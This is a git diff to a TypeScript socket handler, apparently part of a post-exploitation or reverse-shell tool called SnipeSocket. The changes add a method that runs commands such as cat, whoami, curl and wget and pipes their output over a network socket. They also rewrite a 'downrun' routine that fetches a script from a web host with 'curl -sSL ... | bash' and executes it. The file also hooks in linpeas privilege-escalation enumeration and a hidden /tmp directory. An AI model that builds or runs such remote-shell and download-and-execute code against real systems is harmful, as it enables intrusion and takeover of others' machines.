@@ -7,10 +7,11 @@ import net from 'net';
 import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
-const WEB_HOST = 'http://192.168.1.67:8000';
+const WEB_HOST = 'http://localhost:8000';
 const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
 const UNIX_DEFAULT = 'bin/sh';
 const TMP_DIR = `/tmp/.f11`;
+const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];
 
 // Constants
 const NEWLINE = `\r\n`;
@@ -86,12 +87,39 @@ class SnipeSocket {
     return `${this.sock.remoteAddress}:${this.sock.remotePort}`
   }
 
-  public downrun(file: string, cb?: Function): void {
-    const url = `${WEB_HOST}/${file}`;
-    const args = [ '-c', `curl -sSL ${url} | bash` ];
+  public command(data: string, cb?: Function): void {
+    const args = data.toString().trim().split(' ').map(p => p.trim());
+    const cmd = args.shift() as string;
+    this.inShell = true;
 
-    this.spawn('/bin/sh', args, false, (code) => {
-      msg('info', `[downrun] Child process exited with code ${code}`);
+    const cp = spawn(cmd, args, { shell: true, detached: true });
+    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
+    cp.stdout.on('data', this.sock.write.bind(this.sock));
+    cp.stderr.on('data', this.sock.write.bind(this.sock));
+
+    cp.on('close', (code) => {
+      msg('debug', `[downrun] Child process exited with code ${code}`);
+      this.inShell = false;
+
+      if (cb) cb(code);
+    });
+  }
+
+  public downrun(file: string, cb?: Function): void {
+    this.inShell = true;
+    const url = `${WEB_HOST}/${file}`;
+    // const dwn = `${TMP_DIR}/${file}`;
+
+    const cp = spawn('curl', [`-sSL ${url} | bash`], { shell: true, detached: true });
+    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
+    cp.stdout.on('data', this.sock.write.bind(this.sock));
+    cp.stderr.on('data', this.sock.write.bind(this.sock));
+
+    cp.on('close', (code) => {
+      msg('debug', `[downrun] Child process exited with code ${code}`);
+      this.inShell = false;
+
+      if (cb) cb(code);
     });
   }
 
@@ -105,16 +133,16 @@ class SnipeSocket {
     this.prompt();
   }
 
-  public spawn (cmd: string, args?: string[], stable?: boolean, cb?: (code: number | null) => void) {
+  public spawn (cmd: string, args?: string[], stable?: boolean, opts?: any, cb?: (code: number | null) => void) {
     this.inSpawn = true;
-    this.cp = spawn(cmd, args);
-    if (stable) this.cp.stdin.write(`${STABALIZE}${NEWLINE}`);
-    this.sock.pipe(this.cp.stdin);
-    this.cp.stdout.pipe(this.sock);
-    this.cp.stderr.pipe(this.sock);
+    const cp = spawn(cmd, args, opts);
+    if (stable) cp.stdin.write(`${STABALIZE}${NEWLINE}`);
+    this.sock.pipe(cp.stdin);
+    cp.stdout.pipe(this.sock);
+    cp.stderr.pipe(this.sock);
 
     // What about no out?? on enter?
-    this.cp.on('close', (code) => {
+    cp.on('close', (code) => {
       msg('debug', `Child process exited with code ${code}`);
       this.inSpawn = false;
 
@@ -124,7 +152,7 @@ class SnipeSocket {
 
   public shell() {
     this.inShell = true;
-    this.spawn(findShell(), [], true, (code) => {
+    this.spawn(findShell(), [], true, {},  (code) => {
       msg('info', `[shell] Child process exited with code ${code}`);
       this.inShell = false;
     });
@@ -145,8 +173,10 @@ class SnipeSocket {
       this.shell();
     } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
       this.linpeas();
+    } else if (CMD_PASS.includes(cmd)) {
+      this.command(cmd, () => this.prompt());
     } else if (!this.inShell) {
-      this.sock.write(`Command coming soon: ${cmd}`);
+      this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
     }
 
     if (!this.inShell) this.prompt();
